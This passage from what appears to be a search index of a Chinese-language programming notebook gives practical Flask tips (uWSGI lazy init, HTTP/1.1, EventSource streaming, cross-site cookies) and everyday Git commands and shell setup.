\u5ef6\u8fdf\u52a0\u8f7d\u8017\u65f6\u7684\u521d\u59cb\u5316\u64cd\u4f5c","text":"<p>\u9700\u6c42\uff1a\u7279\u5b9a\u9875\u9762\u9700\u8981\u52a0\u8f7d\u4e00\u4e9b\u8017\u65f6\u7684\u8d44\u6e90\uff0c\u5982\u679c\u5728\u5e94\u7528\u542f\u52a8\u7684\u65f6\u5019\u505a\u52a0\u8f7d\uff0c\u6b64\u65f6\u65b0\u6765\u7684\u8bf7\u6c42\u5c31\u5fc5\u987b\u7b49\u5f85\u8fd9\u4e2a\u52a0\u8f7d\u624d\u80fd\u5b8c\u6210\uff1b\u800c\u5b9e\u9645\u4e0a\u8fd9\u4e2ainit\u5e76\u975e\u6240\u6709\u8bf7\u6c42\u90fd\u5fc5\u987b\u7684\uff0c\u60f3\u505a\u4e00\u4e2alazyinit: \u5728\u4e0d\u5f71\u54cd\u6b63\u5e38\u8bf7\u6c42\u7684\u524d\u63d0\u4e0b\u5c3d\u5feb\u5b8c\u6210init\u51fd\u6570</p> <p>\u6211\u7684\u505a\u6cd5\uff1a\u8bbe\u8ba1\u4e00\u4e2a<code>/lazyinit</code>\u8def\u7531\u51fd\u6570\u505a\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u5728\u91cd\u65b0\u90e8\u7f72/\u91cd\u542fflask\u670d\u52a1\u7684\u65f6\u5019\u540c\u65f6\u542f\u52a8\u4e00\u4e2a\u7b80\u5355\u7684python\u811a\u672c\u53cd\u590d\u8bf7\u6c42\u8fd9\u4e2aurl\u76f4\u5230\u6240\u6709\u7684\u8fdb\u7a0b\u90fd\u5df2\u7ecf\u89e6\u53d1</p> <p>\u8fd9\u6837\u5229\u7528uwsgi\u81ea\u8eab\u5c31\u6709\u7684\u591a\u8fdb\u7a0b\u8d1f\u8f7d\u5747\u8861\uff0c\u6bcf\u6b21\u6700\u591a\u53ea\u4f1a\u6709\u4e00\u4e2a\u8fdb\u7a0b\u505a\u521d\u59cb\u5316\u5de5\u4f5c\uff0c\u5176\u4ed6\u8fdb\u7a0b\u53ef\u4ee5\u6b63\u5e38\u5904\u7406\u8bf7\u6c42\uff1b\u574f\u5904\u5c31\u662f\u5728\u65e5\u5fd7\u91cc\u9762\u4ea7\u751f\u4e00\u4e9b\u5783\u573e\u5427\uff0c\u5f71\u54cd\u4e0d\u5927</p> <p>\u95ee\u9898\u6765\u4e86 uwsgi\u600e\u4e48\u77e5\u9053\u5f53\u524d\u662f\u54ea\u4e2a\u8fdb\u7a0b\u5462 \u6211\u53d1\u73b0threading\u63d0\u4f9b\u7684\u8fdb\u7a0b\u540d\u79f0\u662f\u5b57\u7b26\u4e32<code>b'uWSGIWorker2Core2'</code>\uff0c\u5176\u4e2d<code>Worker</code>\u540e\u9762\u7684\u6570\u5b57\u5c31\u662f\u8fdb\u7a0bID \u4e0d\u540c\u8fdb\u7a0bID\u7684\u5168\u5c40\u53d8\u91cf\u662f\u4e0d\u540c\u7684</p> <p>\u4ee3\u7801\uff1a</p> <p>flask\u4e2d\u7684<code>/lazyinit</code>\u5b9e\u73b0\uff0c\u8fd4\u56de\u5904\u7406\u5f53\u524d\u8bf7\u6c42\u7684worker id\uff1a</p> <pre><code>import threading\ndef get_workerid():\n    # return uwsgi worker id: int\n    threadname = threading.current_thread().name\n    id_str = threadname.lower().split(\"worker\")[1].split(\"core\")[0]\n    return int(id_str)\n\nHAS_INITED = False\n\n@app.route(\"/lazyinit\")\ndef lazyinit():\n    workerid = get_workerid()\n\n    if not HAS_INITED: # skip init if has already initialized\n        sleep(1) # do real init code...\n        HAS_INITED = True\n\n    return str(workerid)\n</code></pre> <p>\u8fd9\u662f\u53cd\u590d\u8bf7\u6c42\u7684\u4ee3\u7801\uff0c\u91cd\u590d\u8bf7\u6c42\u6700\u591a100\u6b21\uff0c\u76f4\u5230\u6240\u67094\u4e2a\u8fdb\u7a0b\u90fd\u5df2\u7ecf\u89e6\u53d1\uff0c\u5176\u4e2duwsgi\u7684workerid\u662f\u4ece1\u5f00\u59cb\u8ba1\u6570\u7684</p> <pre><code>MAX_TRIES = 100\nPROCESS_COUNT = 4\n\nimport requests\ni = 0\nstatus = [False]*PROCESS_COUNT\nfor i in range(MAX_TRIES):\n    id = requests.get(\"http://127.0.0.1/lazyinit?id=\"+str(i)).text\n    id = int(id) - 1\n    status[id] = True\n    if all(status):\n        break\n</code></pre>"},{"location":"Flask/#apprunhttp11","title":"\u8ba9app.run\u542f\u52a8\u7684\u670d\u52a1\u5668\u4f7f\u7528HTTP/1.1","text":"<p>\u5c31\u662f\u8fd9\u4e2a\u95ee\u9898\uff1a https://www.reddit.com/r/flask/comments/634i5u/make_flask_return_header_response_with_http11/</p> <p>\u4eba\u5bb6\u8ba4\u4e3aFlask\u4e0d\u652f\u6301\uff0c\u5176\u5b9eflask\u4f7f\u7528\u7684\u662f<code>werkzeug.serving</code>\uff0c\u6700\u5e95\u5c42\u8fd8\u662fBaseHTTPRequestHandler\uff0c\u800c\u8fd9\u4e2a\u662f\u652f\u6301HTTP/1.1\u7684\uff0c\u53ea\u662f\u9ed8\u8ba4HTTP/1.0\u800c\u5df2</p> <p>\u5b9e\u9645\u53d1\u9001\u8bf7\u6c42<code>HTTP/1.1 200 OK</code>\u662f\u8fd9\u4e2a\u7c7b\u7684<code>send_response</code>\u51fd\u6570\uff0c\u7528\u5230<code>protocol_version</code>\u8fd9\u4e2a\u5c5e\u6027\uff0c\u800c\u8fd9\u4e2a\u5c5e\u6027\u662f\u7c7b\u7684\u5c5e\u6027\uff08\u4e0d\u662f\u5728<code>__init__</code>\u51fd\u6570\u8d4b\u503c\u7684\uff09\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 \u4e4b\u540e\u521b\u5efa\u7684\u5bf9\u8c61\u5c31\u4f1a\u81ea\u52a8\u62e5\u6709\u65b0\u7684\u503c</p> <p>\u5728\u8c03\u7528\u4e4b\u524d\u6dfb\u52a0\u4ee5\u4e0b\u51e0\u884c\u5373\u53ef</p> <pre><code>try:\n    from http.server import BaseHTTPRequestHandler\nexcept: #PY2\n    from BaseHTTPServer import BaseHTTPRequestHandler\nBaseHTTPRequestHandler.protocol_version = \"HTTP/1.1\"\n</code></pre>"},{"location":"Flask/#render_template_1","title":"\u8ba9render_template\u76f4\u63a5\u80fd\u4f7f\u7528\u5f53\u524d\u6240\u6709\u53d8\u91cf","text":"<p>\u4e00\u79cd\u76f4\u63a5\u7684\u505a\u6cd5\uff1a\u6ce8\u610f\u987a\u5e8f \u5c40\u90e8\u53d8\u91cf\u4f18\u5148\u4e8e\u5168\u5c40\u53d8\u91cf</p> <pre><code>targs = globals()\ntargs.update(locals())\nrender_template(\"x.html\", **targs)\n</code></pre> <p>\u7136\u800c\u8fd9\u6837\u9700\u8981\u6bcf\u4e2a\u89c6\u56fe\u51fd\u6570\u90fd\u5199\u8fd9\u4e09\u884c\uff0c\u4e0d\u591f\u4f18\u96c5</p> <p>\u4e0d\u5982\u8bd5\u8bd5\uff1a\u83b7\u53d6\u8c03\u7528\u8005\u7684\u5c40\u90e8\u53d8\u91cf https://stackoverflow.com/questions/6618795/get-locals-from-calling-namespace-in-python</p> <pre><code>import inspect\ndef myrender_template(filename):\n    backframe = inspect.currentframe().f_back\n    targs = {}\n    targs.update(backframe.f_globals)\n    targs.update(backframe.f_locals)\n    return render_template(filename, **targs)\n</code></pre>"},{"location":"Flask/#flaskeventsource","title":"\u5728Flask\u4e2d\u6b63\u786e\u5730\u4ea7\u751f\u6d41\u5f0f\u54cd\u5e94EventSource","text":"<p>\u8003\u8651\u6211\u4eec\u9700\u8981\u5411\u524d\u7aef\u63d0\u4f9b\u6d88\u606f\u961f\u5217\u7684\u6d88\u8d39\u8005\uff0c\u6bd4\u5982\u6536\u5230\u5e7f\u64ad\u540e\u53d1\u7ed9\u6d4f\u89c8\u5668\u901a\u77e5\u7528\u6237\u3002\u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u7528websocket\uff0c\u4f46\u8fd9\u79cd\u573a\u666f\uff08\u53ea\u6709\u670d\u52a1\u5668\u7ed9\u6d4f\u89c8\u5668\u53d1\uff09\u4e0b\u53ea\u9700\u8981\u957f\u8fde\u63a5\u7684EventSource\u5c31\u884c\u4e86\u3002</p> <p>\u57fa\u7840\u7bc7\uff1a https://stackoverflow.com/questions/12232304/how-to-implement-server-push-in-flask-framework</p> <pre><code>def queue_consumer():\nconn = \u521b\u5efa\u8fde\u63a5() #\u8fde\u63a5\u5230\u6d88\u606f\u961f\u5217\uff0c\u521b\u5efa channel\nfor data in conn.\u8bfb\u53d6\u6570\u636e():\nyield b\"data: \"+data+b\"\\n\\n\"\n\u5173\u95ed\u8fde\u63a5() # \u600e\u4e48\u6267\u884c\u5230\uff1f\n\n@app.route(\"/stream\")\ndef stream():\nreturn Response(queue_consumer(), mimetype=\"text/event-stream\")\n</code></pre> <p>\u8fd9\u4e2a\u7684\u95ee\u9898\u5728\u4e8e\u5173\u95ed\u8fde\u63a5\u4e0d\u4f1a\u6267\u884c\u5230\uff0c\u5728\u6d88\u606f\u961f\u5217\u670d\u52a1\u5668\u4e0a\u89c2\u5bdf\u5230channel\u4e00\u76f4\u6ca1\u6709\u91ca\u653e\uff0c\u8fd9\u80af\u5b9a\u4e0d\u884c\uff0c\u6211\u4eec\u9700\u8981\u5728\u6d4f\u89c8\u5668\u65ad\u5f00\u8fde\u63a5\u7684\u65f6\u5019\u81ea\u52a8\u91ca\u653econn\u7b49\u8d44\u6e90\u3002</p> <p>\u8bfb\u4e86 werkzeug \u7684\u6e90\u4ee3\u7801\u53d1\u73b0 Response \u6709 call_on_close \u51fd\u6570\uff0c\u5728\u8fde\u63a5\u5173\u95ed\u7684\u65f6\u5019\u6211\u4eec\u628a\u751f\u6210\u5668close\u5373\u53ef\u89e6\u53d1yield\u7684\u5f02\u5e38\uff1a</p> <pre><code>def queue_consumer():\nconn = \u521b\u5efa\u8fde\u63a5() #\u8fde\u63a5\u5230\u6d88\u606f\u961f\u5217\uff0c\u521b\u5efa channel\ntry:\nfor data in conn.\u8bfb\u53d6\u6570\u636e():\nyield b\"data: \"+data+b\"\\n\\n\" #\u7ed3\u675f\u7684\u65f6\u5019\u4f1a\u89e6\u53d1GeneratorExit\u5f02\u5e38\nexcept:\npass\n\u5173\u95ed\u8fde\u63a5()\n\n@app.route(\"/stream\")\ndef stream():\nconsumer = queue_consumer()\nres = Response(consumer, mimetype=\"text/event-stream\")\ndef onclose():\nconsumer.close()\nres.call_on_close(onclose)\nreturn res\n</code></pre> <p>\u8fd9\u6837\u8fd8\u4e0d\u591f\uff0c\u53d1\u73b0\u65e0\u6cd5\u4f7f\u7528g\uff0c\u4ee5\u53caNginx\u9ed8\u8ba4\u7f13\u5b58\u54cd\u5e94\u5bfc\u81f4\u5ef6\u8fdf\uff0c\u9700\u8981\u7ee7\u7eed\u914d\u7f6e\uff1a</p> <pre><code>def queue_consumer():\nconn = \u521b\u5efa\u8fde\u63a5() #\u8fde\u63a5\u5230\u6d88\u606f\u961f\u5217\uff0c\u521b\u5efa channel\ntry:\nfor data in conn.\u8bfb\u53d6\u6570\u636e():\nyield b\"data: \"+data+b\"\\n\\n\" #\u7ed3\u675f\u7684\u65f6\u5019\u4f1a\u89e6\u53d1GeneratorExit\u5f02\u5e38\nexcept:\npass\n\u5173\u95ed\u8fde\u63a5()\n\n@app.route(\"/stream\")\ndef stream():\nconsumer = queue_consumer()\nres = Response(stream_with_context(consumer), mimetype=\"text/event-stream\")\ndef onclose():\nconsumer.close()\nres.call_on_close(onclose)\nres.headers[\"X-Accel-Buffering\"] = \"no\"\nres.headers[\"Cache-Control\"] = \"no-cache\"\nreturn res\n</code></pre> <p>\u8fd9\u4e9bNginx\u914d\u7f6e\u4f60\u4e5f\u53ef\u80fd\u9700\u8981\u52a0\u4e0a\uff1a\u5c24\u5176\u662f\u8fd8\u6709\u4e0b\u4e00\u5c42\u53cd\u4ee3\u7684\u65f6\u5019</p> <pre><code>uwsgi_pass_header \"X-Accel-Buffering\";\nuwsgi_read_timeout 120s;\nuwsgi_send_timeout 120s;\n\nproxy_http_version 1.1;\nproxy_set_header Connection \"\";\nproxy_pass_header \"X-Accel-Buffering\";\n</code></pre>"},{"location":"Flask/#flaskcookie","title":"Flask\u8de8\u57dfCookie","text":"<p>\u5f53\u6211\u4eec\u7684\u7f51\u7ad9\u80fd\u88ab\u8de8\u57df\u8bbf\u95ee\u7684\u65f6\u5019\uff0c\u8981\u6ce8\u610fcookie\u7684\u8bbe\u7f6e\uff0c\u52a0\u4e0a<code>SameSite=None; Secure</code></p> <p>\u53c2\u8003:</p> <ul> <li>https://stackoverflow.com/questions/56828663/how-to-explicitly-set-samesite-none-on-a-flask-response</li> <li>https://github.com/pallets/werkzeug/issues/1549</li> <li>https://stackoverflow.com/questions/62992831/python-session-samesite-none-not-being-set</li> </ul> <pre><code>resp.set_cookie('cross-site-cookie', 'bar', samesite='None', secure=True)\nresp.headers.add('Set-Cookie','cross-site-cookie=bar; SameSite=None; Secure')\n</code></pre> <p>Flask\u7684session cookie\u4e5f\u8981\u8de8\u57df\u7684\u8bdd\uff1a</p> <pre><code>from flask import session\nfrom flask.sessions import SecureCookieSessionInterface\n\nsession_cookie = SecureCookieSessionInterface().get_signing_serializer(app)\n@app.after_request\ndef cookies(response):\n    same_cookie = session_cookie.dumps(dict(session))\n    response.headers.add(\"Set-Cookie\", f\"session={same_cookie}; Secure; HttpOnly; SameSite=None; Path=/;\")\n    return response\n</code></pre>"},{"location":"Git/","title":"Git","text":"<p>\u53c2\u8003 \u6c89\u6d78\u5f0f\u5b66 Git http://igit.linuxtoy.org/</p> <p>\u53c2\u8003 Learn Git Branching learngitbranching.js.org</p>"},{"location":"Git/#_1","title":"\u7acb\u5373\u4f7f\u7528","text":"<p>\u5728\u7f51\u9875\u4e0a\u5148\u521b\u5efa\u4e86\u4ed3\u5e93\uff0c\u8bbe\u7f6e\u597d.gitignore</p> <pre><code>git clone  github\u63d0\u4f9b\u7684\u5730\u5740(\u7528ssh\u7684)\n# \u73b0\u5728\u521b\u5efa\u4e86\u4f60\u7684\u4ed3\u5e93\u6587\u4ef6\u5939\uff0c\u5c06\u9700\u8981\u4e0a\u4f20\u7684\u6587\u4ef6\u653e\u8fdb\u53bb\ncd \u4f60\u7684\u4ed3\u5e93\u540d\u79f0\ngit add .\ngit commit -a -m \"\u8fd9\u6b21\u6539\u4e86\u4e9b\u5565\uff1f\"\ngit push\n</code></pre> <p>\u66f4\u591a\u7684\u914d\u7f6e\uff1a</p> <pre><code># \u9ed8\u8ba4git pull --rebase\ngit config --global pull.rebase true\n</code></pre>"},{"location":"Git/#git-clone","title":"\u52a0\u901fgit clone","text":"<p>\u65b9\u6cd51\uff1a\u914d\u7f6e\u4e00\u4e2a\u4ee3\u7406(\u5982privoxy)\uff0c\u5e76\u4f7f\u7528https\u5730\u5740</p> <p>\u65b9\u6cd52\uff1a\u4f7f\u7528<code>--depth 1</code>\u53c2\u6570\u8868\u793a\u4e0d\u8981\u590d\u5236\u5386\u53f2</p> <pre><code>export https_proxy=\"http://127.0.0.1:8118\"\ngit clone --depth 1 https://github.com/zjuchenyuan/notebook\n</code></pre>"},{"location":"Git/#git-push","title":"git push\u52a0\u901f","text":"<p>\u4ee3\u7801\u53c2\u89c1code/ssgit.txt</p>"},{"location":"Git/#git-push_1","title":"git push\u514d\u5bc6\u7801","text":"<p>\u53c2\u7167http://blog.csdn.net/chfe007/article/details/43388041</p> <p>\u9996\u5148\u751f\u6210\u81ea\u5df1\u7684ssh\u5bc6\u94a5\uff0c\u4e0d\u8981\u4fee\u6539\u751f\u6210\u7684\u6587\u4ef6\u4f4d\u7f6e</p> <pre><code>ssh-keygen -t rsa -b 4096\n</code></pre> <p>\u7136\u540e\u628a<code>~/.ssh/id_rsa.pub</code>\u7684\u5185\u5bb9\u8bbe\u7f6e\u5230github\u4e2d\uff0c\u7f51\u9875\u7aef\u64cd\u4f5c\uff1b\u5efa\u8bae\u987a\u5e26\u542f\u7528\u4e24\u6b65\u9a8c\u8bc1</p> <p>\u65b0\u624b\u8fd8\u544a\u8bc9git\u81ea\u5df1\u662f\u8c01\uff1a</p> <pre><code>git config --global user.email \"\u4f60\u7684\u90ae\u7bb1\"\ngit config --global user.name \"\u4f60\u7684\u7528\u6237\u540d\"\n</code></pre> <p>\u5982\u679c\u5f53\u524d\u4ed3\u5e93\u662fhttps\u7684\uff0c\u6539\u4e3agit\u65b9\u5f0f\uff1a</p> <pre><code>git remote set-url origin git@github.com:\u7528\u6237\u540d/\u4ed3\u5e93\u540d\u79f0.git\n</code></pre>"},{"location":"Git/#bash","title":"bash\u522b\u540d\u8bbe\u7f6e","text":"<p>\u901a\u8fc7\u4fee\u6539~/.bashrc\u6765\u8bbe\u7f6e\u522b\u540d\uff0c\u8ba9git\u7684\u65e5\u5e38\u4f7f\u7528\u66f4\u7b80\u5355\uff1a</p> <pre><code>func_g(){\ngit add .\ngit commit -a -m \"$1\"\ngit push\n}\nalias g=func_g\nalias gs='git status '\nalias ga='git add '\nalias gb='git branch '\nalias gc='git commit'\nalias gd='git diff'\nalias go='git checkout '\nalias gp='git push'\nalias gl=\"git log --all --pretty=format:'%h %ad | %s%d [%an]' --graph --date=short\"\n</code></pre> <p></p> <p>\u5b8c\u6210\u4e00\u6b21\u63d0\u4ea4\uff0c\u73b0\u5728\u53ea\u9700\u8981<code>g \"\u63d0\u4ea4\u4fe1\u606f\"</code></p> <p>\u8981\u7acb\u5373\u751f\u6548\uff0c\u53ef\u4ee5\u6267\u884c<code>source ~/.bashrc</code></p>"},{"location":"Git/#bashdirty","title":"\u8bbe\u7f6ebash\u4e2d\u7684\u81ea\u52a8\u5b8c\u6210\u4e0edirty\u63d0\u793a","text":"<p>\u6b64\u90e8\u5206\u5185\u5bb9\u6765\u81eaUdacity \u5982\u4f55\u4f7f\u7528 Git \u548c GitHub \u8bfe\u7a0b</p> <p>\u4e0b\u8f7d\u9700\u8981\u7684\u6587\u4ef6</p> <pre><code>curl -O https://raw.githubusercontent.com/git/git/master/contrib/completion/git-completion.bash\ncurl -O https://raw.githubusercontent.com/git/git/master/contrib/completion/git-prompt.sh\n</code></pre> <p>\u5728<code>~/.bashrc</code>\u672b\u5c3e\u6dfb\u52a0\uff1a</p> <pre><code>source ~/git-completion.bash\ngreen=\"\\[\\033[0;32m\\]\"\nblue=\"\\[\\033[0;34m\\]\"\npurple=\"\\[\\033[0;35m\\]\"\nreset=\"\\[\\033[0m\\]\"\nsource ~/git-prompt.sh\nexport GIT_PS1_SHOWDIRTYSTATE=1\nexport PS1=\"$purple\\u$green\\$(__git_ps1) \\w\\a $ $reset\"\n</code></pre> <p>\u6548\u679c\u5982\u56fe\uff0c\u5982\u679c\u51fa\u73b0\u4e86\u672a\u63d0\u4ea4\u7684\u4fee\u6539\uff0c\u4f1a\u81ea\u52a8\u663e\u793a\u51fa*\u8868\u793adirty\uff1a</p> <p></p>"},{"location":"Git/#_2","title":"\u597d\u73a9\u7684\u547d\u4ee4\u4eec","text":""},{"location":"Git/#git-status","title":"git status","text":"<p>\u67e5\u770b\u72b6\u6001\u54af~</p>"},{"location":"Git/#git-reset","title":"git reset","text":"<p>\u5df2\u7ecf<code>git add</code>\u4e86\uff0c\u60f3\u53d6\u6d88\u8fd9\u4e00\u6b65\u5c31\u7528<code>git reset</code></p>"},{"location":"Git/#git-checkout","title":"git checkout","text":"<p>\u554a\u3002\u3002\u3002\u4ee3\u7801\u641e\u574f\u4e86\u6211\u8981\u56de\u6eda\u5230\u4e0a\u6b21commit\uff0c\u7528<code>git checkout -- \u6587\u4ef6\u540d</code></p>"},{"location":"Git/#git-reset-soft","title":"git reset \u2013soft  <p>\u64a4\u9500\u5230\u67d0\u6b21commit\uff0c\u4f46\u4e0d\u5220\u9664\u65b0\u589e\u6587\u4ef6</p> <p>\u5176\u4e2dcommit_id\u53ef\u4ee5\u4ece<code>git log</code>\u83b7\u5f97</p>","text":""},{"location":"Git/#git-reset-hard","title":"\u6062\u590dgit reset \u2013hard\u5220\u9664\u7684\u6587\u4ef6 <p>git\u7684\u5386\u53f2\u662f\u4e0d\u80fd\u7528\u547d\u4ee4\u4fee\u6539\u7684\uff0c\u4e22\u5931\u7684commit\u7528reflog\u53ef\u4ee5\u627e\u56de\uff0c\u9664\u975egit\u5df2\u7ecf\u628a\u5b83\u5f53\u6210\u5783\u573e\u5220\u9664\uff0830\u5929\uff09</p> <pre><code>git stash save\ngit reflog # \u67e5\u770b\u4e22\u5931\u7684\u90a3\u4e2acommit\u7684id\ngit checkout \u90a3\u4e2acommitid\ngit branch recover # \u521b\u5efarecover\u5206\u652f\ngit checkout master # \u56de\u5230master\ngit merge recover # \u5408\u5e76recover\u5230master\ngit branch -d recover # \u5408\u5e76\u5b8c\u6210\u540e\u5c31\u53ef\u4ee5\u5220\u4e86\n</code></pre>","text":""},{"location":"Git/#_3","title":"\u4f60\u53ef\u80fd\u4f1a\u95ee\u7684\u4e00\u4e9b\u95ee\u9898","text":"<ul> <li>\u4e3a\u5565\u8981git add\u5462?</li> </ul> <p>\u56e0\u4e3a\u6709\u4e9b\u65f6\u5019\u4e24\u4e2a\u6587\u4ef6\u53ef\u80fd\u662f\u4e0d\u76f8\u5173\u7684\u4fee\u6539\uff0c\u5e94\u8be5\u5206\u522b\u63d0\u4ea4\u4e24\u6b21</p> <p>\u901a\u8fc7\u5206\u5f00\u6682\u5b58\u548c\u63d0\u4ea4\uff0c\u4f60\u80fd\u591f\u66f4\u52a0\u5bb9\u6613\u5730\u8c03\u4f18\u6bcf\u4e00\u4e2a\u63d0\u4ea4\u3002</p> <ul> <li>\u4e3a\u5565\u4e0d\u6539.profile\u800c\u662f\u6539.bashrc\u5462</li> </ul> <p>\u56e0\u4e3awin10\u4e2d\u53ea\u8981\u6709\u4e00\u4e2abash\u7a97\u53e3\u6ca1\u5173\u6389\uff0c\u542f\u52a8bash\u5c31\u4e0d\u662f\u767b\u5f55\uff0c\u800c\u662f\u76f8\u5f53\u4e8e\u518d\u5f00\u4e86\u4e2a<code>docker exec -i -t bashonwin10 /bin/bash</code></p> <p>\u6b64\u65f6\u662f\u4e0d\u4f1a\u6267\u884c\u767b\u5f55\u811a\u672c.profile\u7684\uff0c\u4f46\u662f.bashrc\u8fd8\u662f\u4f1a\u6267\u884c\u7684</p>"},{"location":"Git/#git_1","title":"Git\u5404\u79cd\u60c5\u666f","text":"<p>Learned from githug</p>"},{"location":"Git/#aliba","title":"\u5ffd\u7565*.a\u6587\u4ef6\u4f46\u4e0d\u60f3\u5ffd\u7565lib.a <p>\u6587\u6863\u67e5\u770b\uff1a<code>git gitignore --help</code></p> <p>!\u8868\u793a\u8d1f\u5411\u9009\u62e9\uff0c\u5728.gitignore\u4e2d\u6dfb\u52a0\uff1a</p> <pre><code>*.a\n!lib.a\n</code></pre>","text":""},{"location":"Git/#commit","title":"commit\u8865\u4e0a\u5fd8\u6389\u7684\u6587\u4ef6 <p>\u5982\u679c\u53d1\u73b0\u4e0a\u6b21commit\u6f0f\u4e86\u6587\u4ef6\uff0c\u4e0d\u5e94\u8be5\u65b0\u52a0commit\u800c\u662f\u5e94\u8be5\u7528amend\uff0c\u5426\u5219\u53ef\u80fd\u4e0aCI\u5c31\u6302</p> <pre><code>git add forgotten.txt\ngit commit --amend\n</code></pre>","text":""},{"location":"Git/#_4","title":"\u67e5\u51fa\u6b64\u884c\u4ee3\u7801\u7684\u6700\u540e\u4fee\u6539\u8005 <p>github\u63d0\u4f9b\u7684blame\u529f\u80fd\u66f4\u597d\u770b\uff0c\u663e\u793a\u6bcf\u884c\u4ee3\u7801\u7684\u4f5c\u8005\u548c\u6765\u6e90\u4e8e\u54ea\u6b21commit</p> <pre><code>git blame filename\n</code></pre>","text":""},{"location":"Git/#commit_1","title":"\u6587\u4ef6\u4e00\u6b21\u6027\u6539\u592a\u591a\u4e86\uff0c\u62c6\u6210\u591a\u6b21commit <p>\u8ba9\u6bcf\u6b21commit\u4fdd\u6301\u5728\u6bd4\u8f83\u5c0f\u7684\u6539\u52a8\uff0c\u4e0d\u8981\u5728\u4e00\u4e2acommit\u4e2d\u51fa\u73b0\u4e24\u4e2a\u4e0d\u90a3\u4e48\u76f8\u5173\u7684\u4fee\u6539</p> <p>\u672c\u77e5\u8bc6\u5b66\u4e60\u81ea\uff1a10 \u4e2a\u8fc5\u901f\u63d0\u5347\u4f60 Git \u6c34\u5e73\u7684\u63d0\u793a</p> <p>\u65b9\u6cd5\u662f\u5728add\u7684\u65f6\u5019\u7ed9\u51fa\u53c2\u6570-p</p> <p>\u7136\u540egit\u4f1a\u5728\u6bcf\u4e00\u4e2a\u4fee\u6539\u7684block\u8be2\u95ee\u662f\u5426\u52a0\u5165\u8fd9\u6b21\u7684commit\uff0c\u56de\u7b54y\u8868\u793a\u52a0\u5165\uff0cn\u8868\u793a\u4e0d\u52a0\u5165\uff0cs\u8868\u793a\u8fdb\u4e00\u6b65\u62c6\u5206\u8fd9\u4e2ablock</p> <p>\u5b8c\u6210\u597d\u9009\u62e9\u540e\uff0c\u4f7f\u7528<code>git diff --staged</code>\u547d\u4ee4\u6765\u67e5\u8be2\u6682\u5b58\u7684\u4fee\u6539\uff0c\u6ca1\u6709\u95ee\u9898\u5c31\u53ef\u4ee5\u7ee7\u7eed<code>git commit</code>\u5566</p>","text":""},{"location":"Git/#_5","title":"\u672c\u5730\u5ffd\u7565\u4e00\u4e9b\u4e2a\u4eba\u7684\u4fee\u6539 <p>\u539f\u6587\uff1a http://stackoverflow.com/questions/1753070/git-ignore-files-only-locally</p> <p>\u6709\u65f6\u5019\u6211\u4eec\u4e0d\u60f3\u8ba9git\u8ffd\u8e2a\u4e00\u4e9b\u4e2a\u4eba\u76f8\u5173\u7684\u6587\u4ef6\uff0c\u4f8b\u5982config\u4e2d\u4fee\u6539Debug=True\uff0c\u6b64\u65f6\u5982\u679c\u53bb\u4fee\u6539.gitignore\u9020\u6210\u7684\u5f71\u54cd\u662f\u5168\u5c40\u7684\uff0c\u5e76\u4e14\u9700\u8981\u4ecegit\u4e2d\u5220\u9664\u8fd9\u4e2a\u6587\u4ef6\uff1b\u624b\u52a8\u907f\u5f00add config\u5f88\u70e6\uff0c\u6709\u6ca1\u6709\u66f4\u597d\u7684\u65b9\u6cd5\uff0c\u8ba9git\u5ffd\u7565\u6389config\u6587\u4ef6\u7684\u4fee\u6539\u5462\uff1f</p> <p>\u65b9\u6cd5\u662f\u4fee\u6539<code>.git/info/exclude</code>\u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u7684\u8bed\u6cd5\u89c4\u5219\u4e0e.gitignore\u4e00\u6837</p> <p>\u5982\u679c\u5df2\u7ecf\u9020\u6210\u4e86\u4fee\u6539\uff0c\u8fd8\u9700\u8981\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff1a</p> <pre><code>git update-index --assume-unchanged [&lt;file&gt;...]\n</code></pre>","text":""},{"location":"Git/#branchpushgit-push-u","title":"\u672c\u5730\u521b\u5efabranch\u540epush\u64cd\u4f5cgit push -u <p>From: http://stackoverflow.com/questions/2765421/how-do-i-push-a-new-local-branch-to-a-remote-git-repository-and-track-it-too</p> <p>\u6267\u884c\u4e86\u4e00\u4e9b\u4fee\u6539\u5f15\u5165\u65b0\u529f\u80fd\uff0c\u4f46\u8fd8\u4e0d\u80fd\u5de5\u4f5c\uff0c\u51b3\u5b9a\u5efa\u7acb\u4e00\u4e2adev\u5206\u652f\uff1a</p> <pre><code>git checkout -b dev\n</code></pre> <p>\u73b0\u5728\u518d\u6267\u884c<code>git add</code>\uff0c<code>git commit</code>\u540e\uff0c\u9700\u8981\u628a\u65b0\u7684\u5206\u652fpush\u7ed9\u8fdc\u7a0b\u670d\u52a1\u5668\uff1a</p> <pre><code>git push -u origin dev\n</code></pre>","text":""},{"location":"Git/#gpggit","title":"\u7528gpg\u7ed9git\u63d0\u4ea4\u7b7e\u540d","text":"<p>\u53c2\u8003\uff1ahttps://help.github.com/articles/signing-commits-with-gpg/</p> <p>\u4e0b\u8ff0\u4ee5ubuntu16.04\uff08\u5176\u5b9e\u662fbash on win10\uff09\u8bb2\u89e3\u6574\u4e2a\u8fc7\u7a0b</p>"},{"location":"Git/#gpg2","title":"\u5b89\u88c5gpg2 <p>\u67e5\u770bgpg\u7248\u672c\uff1a<code>gpg --version</code>\u53d1\u73b0\u7248\u672c\u662f<code>gpg (GnuPG) 1.4.20</code>\uff0c\u800c\u6559\u7a0b\u8981\u6c42\u89812\u4ee5\u4e0a\uff0c\u6240\u4ee5\u5148\u8981\u5b89\u88c5gpg2\uff0c\u5e76\u544a\u8bc9git\u6211\u4eec\u8981\u4f7f\u7528gpg2\uff1a</p> <pre><code>apt install -y gpg2\ngit config --global gpg.program gpg2\n</code></pre>","text":""},{"location":"Git/#key","title":"\u521b\u5efa\u4e00\u4e2a\u65b0\u7684key <p>\u8fd9\u91ccgithub\u7ed9\u51fa\u7684\u547d\u4ee4\u6709\u95ee\u9898\uff0cgoogle\u53d1\u73b0\u53c2\u6570\u6539\u4e86</p> <pre><code>gpg2 --full-gen-key\n</code></pre> <p>\u56de\u8f66\u9009\u62e9RSA and RSA\uff0c\u7136\u540e\u8f93\u5165\u5bc6\u94a5\u5927\u5c0f\u8f93\u51654096\uff0c\u7136\u540e\u56de\u8f66\u6c38\u4e0d\u8fc7\u671f\uff0c\u786e\u8ba4y\uff0c\u7136\u540e\u8f93\u5165\u81ea\u5df1\u7684\u540d\u5b57\u548c\u90ae\u7bb1 